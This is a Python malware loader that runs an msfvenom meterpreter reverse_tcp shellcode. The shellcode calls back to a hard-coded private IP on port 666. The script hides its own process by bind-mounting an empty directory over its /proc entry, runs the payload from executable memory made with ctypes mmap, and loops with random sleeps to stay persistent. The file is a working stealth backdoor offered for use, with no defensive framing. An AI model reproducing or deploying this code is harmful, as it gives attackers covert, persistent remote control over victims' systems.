from ctypes import (CDLL, c_void_p, c_size_t, c_int, c_long, memmove, CFUNCTYPE, cast, pythonapi)
from ctypes.util import ( find_library )
from sys import exit
import random as r
import time, string, os

# you should run it with root user  
ch = string.ascii_uppercase + string.digits
token = "".join(r.choice(ch) for i in range(5))
pid = os.getpid()
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token))

def mainJob():
    PROT_READ = 0x01
    PROT_WRITE = 0x02
    PROT_EXEC = 0x04
    MAP_PRIVATE = 0x02
    MAP_ANONYMOUS = 0x20
    ENOMEM = -1

    # msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.43.214 LPORT=666 -a x64 --platform linux -f c -o chars.raw
    # pa=$(cat chars.raw | grep -v "=" | tr -d '"; ' | tr -d '\n')
    # echo $pa then put output in SHELLCODE variable
    SHELLCODE = '\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x02\x9a\xc0\xa8\x2b\xd6\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6'
    libc = CDLL(find_library('c'))

    #void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
    mmap = libc.mmap
    mmap.argtypes = [ c_void_p, c_size_t, c_int, c_int, c_int, c_size_t ]
    mmap.restype = c_void_p

    page_size = pythonapi.getpagesize()
    sc_size = len(SHELLCODE)
    mem_size = page_size * (1 + sc_size / page_size )

    cptr = mmap(0, mem_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)

    if cptr == ENOMEM: exit('mmap() memory allocation error')

    if sc_size <= mem_size:
        memmove(cptr, SHELLCODE, sc_size)
        sc = CFUNCTYPE(c_void_p, c_void_p)
        call_sc = cast(cptr, sc)
        call_sc(None)

if __name__ == "__main__":
    while 1:
        try:
            mainJob()
        except:
            sleep_for = r.randrange(1,9)
            time.sleep(int(sleep_for))
            pass
